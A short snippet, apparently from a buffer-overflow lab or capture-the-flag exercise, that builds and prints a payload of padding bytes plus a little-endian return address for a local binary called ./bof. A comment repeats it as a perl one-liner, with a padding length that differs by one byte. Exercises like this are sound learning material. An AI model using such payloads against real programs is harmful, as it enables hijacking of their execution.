buf = "A"*23+"\xc3\x51\x55\x55\x55\x55" # some "A"s + return address per pair backward
print(buf)
# ./bof `perl -e 'print "AAAAAAAAAAAAAAAAAAAAAAAA\xc3\x51\x55\x55\x55\x55"'`